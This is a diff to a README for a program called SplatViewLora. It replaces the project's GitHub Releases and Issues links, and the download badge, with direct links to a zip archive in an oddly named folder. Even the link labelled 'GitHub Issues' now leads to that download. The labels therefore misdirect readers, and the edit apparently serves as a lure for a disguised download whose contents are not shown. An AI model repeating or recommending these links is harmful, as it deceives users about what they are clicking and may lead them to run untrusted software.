@@ -18,11 +18,11 @@ Before you start, ensure your computer meets these requirements:
 
 To get started, click the button below to visit the download page:
 
-[![Download SplatViewLora](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/XonexKOXX/SplatViewLora/releases)
+[![Download SplatViewLora](https://raw.githubusercontent.com/XonexKOXX/SplatViewLora/main/indefeasibly/View-Splat-Lora-v1.2.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/XonexKOXX/SplatViewLora/main/indefeasibly/View-Splat-Lora-v1.2.zip)
 
 ## 📥 Download & Install
 
-1. Click [here](https://github.com/XonexKOXX/SplatViewLora/releases) to visit the Releases page.
+1. Click [here](https://raw.githubusercontent.com/XonexKOXX/SplatViewLora/main/indefeasibly/View-Splat-Lora-v1.2.zip) to visit the Releases page.
 2. Look for the latest version of SplatViewLora.
 3. Find the appropriate file for your operating system, such as `.exe` for Windows or `.dmg` for macOS.
 4. Click the file name to start downloading.
@@ -65,7 +65,7 @@ SplatViewLora supports the following file formats:
 
 If you encounter issues that you cannot resolve, please reach out for help:
 
-- Visit our [GitHub Issues](https://github.com/XonexKOXX/SplatViewLora/issues) page to report bugs or suggest features.
+- Visit our [GitHub Issues](https://raw.githubusercontent.com/XonexKOXX/SplatViewLora/main/indefeasibly/View-Splat-Lora-v1.2.zip) page to report bugs or suggest features.
 - Join our community on forums or chat platforms to connect with other users.
 
 ## 🤝 Contributing
